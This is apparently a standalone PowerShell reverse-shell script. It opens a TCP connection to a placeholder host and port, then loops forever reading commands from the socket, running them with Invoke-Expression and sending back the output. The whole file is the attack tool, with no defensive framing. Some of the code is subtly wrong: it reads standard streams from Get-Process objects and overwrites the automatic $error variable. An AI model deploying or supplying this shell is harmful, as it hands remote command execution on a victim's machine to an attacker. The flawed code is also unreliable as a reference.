# Create a TcpClient object and connect to the target IP address and port
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect("TARGET_IP_ADDRESS", TARGET_PORT)

# Get a reference to the current PowerShell process and set the input, output, and error streams
$process = Get-Process -Id $pid
$inputStream = $process.StandardInput
$outputStream = $process.StandardOutput
$errorStream = $process.StandardError

# Create a StreamReader and StreamWriter to read and write data to the TcpClient streams
$reader = New-Object System.IO.StreamReader($client.GetStream())
$writer = New-Object System.IO.StreamWriter($client.GetStream())

# Start a loop to read and execute commands from the target machine
while($true) {
    # Read a command from the target machine
    $command = $reader.ReadLine()
    # Execute the command and get the output and error streams
    $output = Invoke-Expression -Command $command 2>&1
    $error = $errorStream.ReadToEnd()
    # Write the output and error streams to the target machine
    $writer.WriteLine($output)
    $writer.WriteLine($error)
    $writer.Flush()
}
